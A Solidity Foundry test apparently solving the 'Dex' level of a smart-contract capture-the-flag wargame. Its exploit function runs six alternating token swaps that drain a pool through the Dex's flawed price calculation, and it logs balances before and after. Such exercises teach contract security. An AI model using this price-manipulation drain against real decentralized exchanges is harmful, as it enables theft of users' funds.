// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;
pragma experimental ABIEncoderV2;

import "lib/forge-std/src/BaseTest.sol";
import {DexFactory, Dex} from "src/levels/22-Dex/DexFactory.sol";
// import {DexAttack} from "src/levels/22-Dex/DexAttack.sol";

import "src/utilities/ERC20-08.sol";

contract TestDex is BaseTest {
    Dex private level;

    ERC20 token1;
    ERC20 token2;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DexFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Dex(levelAddress);

        // Check that the contract is correctly setup

        token1 = ERC20(level.token1());
        token2 = ERC20(level.token2());
        assertEq(
            token1.balanceOf(address(level)) == 100 &&
                token2.balanceOf(address(level)) == 100,
            true
        );
        assertEq(
            token1.balanceOf(player) == 10 && token2.balanceOf(player) == 10,
            true
        );
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);

        // Approve the dex to manage all of our token
        token1.approve(address(level), 2 ** 256 - 1);
        token2.approve(address(level), 2 ** 256 - 1);

        emit log_named_uint(
            "Token1 balance of Dex before attack is",
            level.balanceOf(address(token1), address(level))
        );

        emit log_named_uint(
            "Token2 balance of Dex before attack is",
            level.balanceOf(address(token2), address(level))
        );

        level.swap(address(token1), address(token2), 10);
        level.swap(address(token2), address(token1), 20);
        level.swap(address(token1), address(token2), 24);
        level.swap(address(token2), address(token1), 30);
        level.swap(address(token1), address(token2), 41);
        level.swap(address(token2), address(token1), 45);

        assertEq(
            token1.balanceOf(address(level)) == 0 ||
                token2.balanceOf(address(level)) == 0,
            true
        );

        emit log_string(
            "--------------------------------------------------------------------------"
        );

        emit log_named_uint(
            "Token1 balance of Dex after attack is",
            level.balanceOf(address(token1), address(level))
        );

        emit log_named_uint(
            "Token2 balance of Dex after attack is",
            level.balanceOf(address(token2), address(level))
        );

        vm.stopPrank();
    }

    function swapMax(ERC20 tokenIn, ERC20 tokenOut) public {
        level.swap(
            address(tokenIn),
            address(tokenOut),
            tokenIn.balanceOf(player)
        );
    }
}
